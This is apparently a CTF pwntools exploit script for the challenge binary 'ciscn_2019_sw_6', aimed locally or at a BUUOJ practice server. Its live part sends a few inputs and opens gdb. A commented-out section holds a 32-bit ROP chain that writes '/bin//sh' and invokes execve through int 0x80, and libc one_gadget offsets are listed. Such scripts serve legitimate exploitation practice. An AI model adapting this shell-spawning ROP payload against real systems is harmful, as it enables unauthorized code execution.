import sys
from pwn import *
from struct import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_sw_6')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_2019_sw_6')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',27292)
			elf=ELF('./ciscn_2019_sw_6')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]


		io.recv()
		io.send('aaaa')
		io.recv()
		io.sendline('8')
		# for i in range(300):
		# 	io.recv()
		# 	io.sendline('321')

		# io.recv()
		# io.sendline('+1')
		# io.recv()
		# io.sendline('1')
		# p = ''
		# p += pack('<I', 0x080704fa) # pop edx ; ret
		# p += pack('<I', 0x080ec060) # @ .data
		# p += pack('<I', 0x080b9856) # pop eax ; ret
		# p += '/bin'
		# p += pack('<I', 0x08055efb) # mov dword ptr [edx], eax ; ret
		# p += pack('<I', 0x080704fa) # pop edx ; ret
		# p += pack('<I', 0x080ec064) # @ .data + 4
		# p += pack('<I', 0x080b9856) # pop eax ; ret
		# p += '//sh'
		# p += pack('<I', 0x08055efb) # mov dword ptr [edx], eax ; ret
		# p += pack('<I', 0x080704fa) # pop edx ; ret
		# p += pack('<I', 0x080ec068) # @ .data + 8
		# p += pack('<I', 0x0804a773) # xor eax, eax ; ret
		# p += pack('<I', 0x08055efb) # mov dword ptr [edx], eax ; ret
		# p += pack('<I', 0x08049021) # pop ebx ; ret
		# p += pack('<I', 0x080ec060) # @ .data
		# p += pack('<I', 0x08070521) # pop ecx ; pop ebx ; ret
		# p += pack('<I', 0x080ec068) # @ .data + 8
		# p += pack('<I', 0x080ec060) # padding without overwrite ebx
		# p += pack('<I', 0x080704fa) # pop edx ; ret
		# p += pack('<I', 0x080ec068) # @ .data + 8
		# p += pack('<I', 0x0804a773) # xor eax, eax ; ret
		# p += pack('<I', 0x0807beef) # inc eax ; ret
		# p += pack('<I', 0x0807beef) # inc eax ; ret
		# p += pack('<I', 0x0807beef) # inc eax ; ret
		# p += pack('<I', 0x0807beef) # inc eax ; ret
		# p += pack('<I', 0x0807beef) # inc eax ; ret
		# p += pack('<I', 0x0807beef) # inc eax ; ret
		# p += pack('<I', 0x0807beef) # inc eax ; ret
		# p += pack('<I', 0x0807beef) # inc eax ; ret
		# p += pack('<I', 0x0807beef) # inc eax ; ret
		# p += pack('<I', 0x0807beef) # inc eax ; ret
		# p += pack('<I', 0x0807beef) # inc eax ; ret
		# p += pack('<I', 0x0806e173) # int 0x80
		# for i in range(34):
		# 	io.recv()
		# 	io.sendline(str(u32((p[i*4:i*4+4]))))

		# io.sendline('0')



		# success('heap_base:'+hex(heap_base))
		# success('libc_base:'+hex(libc_base))
		gdb.attach(io)
		pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue